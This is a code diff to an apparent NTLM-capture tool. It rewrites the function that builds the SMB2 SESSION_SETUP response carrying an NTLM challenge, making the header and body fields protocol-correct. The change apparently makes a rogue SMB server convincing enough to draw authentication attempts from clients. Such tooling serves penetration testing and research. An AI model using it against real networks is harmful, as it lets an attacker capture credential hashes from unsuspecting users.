@@ -529,20 +529,47 @@ class NTLMCapture:
         return msg
 
     def _build_smb2_challenge_response(self, ntlm_challenge):
-        """Build a minimal SMB2 response containing the NTLM challenge."""
-        # NetBIOS session header (4 bytes): 0x00 + 3-byte length
-        # For simplicity, wrap the NTLM challenge in a basic structure
-        # This is a simplified representation
-        smb2_header = b"\xfeSMB"  # SMB2 magic
-        smb2_header += b"\x00" * 60  # Minimal SMB2 header padding
+        """Build an SMB2 SESSION_SETUP response containing the NTLM challenge.
 
-        # Security blob containing NTLM Type 2
-        security_blob = ntlm_challenge
+        Constructs a valid SMB2 header (64 bytes) with correct StructureSize,
+        Command (SESSION_SETUP), Status (STATUS_MORE_PROCESSING_REQUIRED),
+        followed by the SESSION_SETUP response body containing the NTLM
+        Type 2 challenge in the security buffer.
+        """
+        # SMB2 Header (64 bytes total)
+        smb2_header = b"\xfeSMB"                      # ProtocolId (4 bytes)
+        smb2_header += struct.pack("<H", 64)           # StructureSize (2 bytes) - MUST be 64
+        smb2_header += struct.pack("<H", 1)            # CreditCharge (2 bytes)
+        smb2_header += struct.pack("<I", 0xC0000016)   # Status: STATUS_MORE_PROCESSING_REQUIRED (4 bytes)
+        smb2_header += struct.pack("<H", 1)            # Command: SESSION_SETUP (2 bytes)
+        smb2_header += struct.pack("<H", 1)            # CreditResponse (2 bytes)
+        smb2_header += struct.pack("<I", 0x01)         # Flags: Response (4 bytes)
+        smb2_header += struct.pack("<I", 0)            # NextCommand (4 bytes)
+        smb2_header += struct.pack("<Q", 1)            # MessageId (8 bytes)
+        smb2_header += struct.pack("<I", 0)            # Reserved (4 bytes)
+        smb2_header += struct.pack("<I", 0)            # TreeId (4 bytes)
+        smb2_header += struct.pack("<Q", 0x0000040000000001)  # SessionId (8 bytes)
+        smb2_header += b"\x00" * 16                    # Signature (16 bytes)
+        # Total: 4+2+2+4+2+2+4+4+8+4+4+8+16 = 64 bytes
 
-        # Combine with NetBIOS header
-        payload = smb2_header + security_blob
-        netbios_header = struct.pack(">I", len(payload))
-        netbios_header = b"\x00" + netbios_header[1:]  # Session message type
+        # SESSION_SETUP Response body (variable)
+        # StructureSize (2 bytes) - must be 9 for SESSION_SETUP response
+        # SessionFlags (2 bytes)
+        # SecurityBufferOffset (2 bytes) - offset from start of SMB2 header
+        # SecurityBufferLength (2 bytes)
+        # Security buffer (NTLM Type 2)
+        security_offset = 64 + 8  # SMB2 header + 8 bytes of response structure
+        session_setup_resp = struct.pack("<H", 9)                          # StructureSize
+        session_setup_resp += struct.pack("<H", 0)                         # SessionFlags
+        session_setup_resp += struct.pack("<H", security_offset)           # SecurityBufferOffset
+        session_setup_resp += struct.pack("<H", len(ntlm_challenge))       # SecurityBufferLength
+        session_setup_resp += ntlm_challenge                               # Security buffer (NTLM Type 2)
+
+        # Combine with NetBIOS session header
+        payload = smb2_header + session_setup_resp
+        netbios_length = len(payload)
+        netbios_header = struct.pack(">I", netbios_length)
+        netbios_header = b"\x00" + netbios_header[1:]  # Session message type 0x00
 
         return netbios_header + payload
 
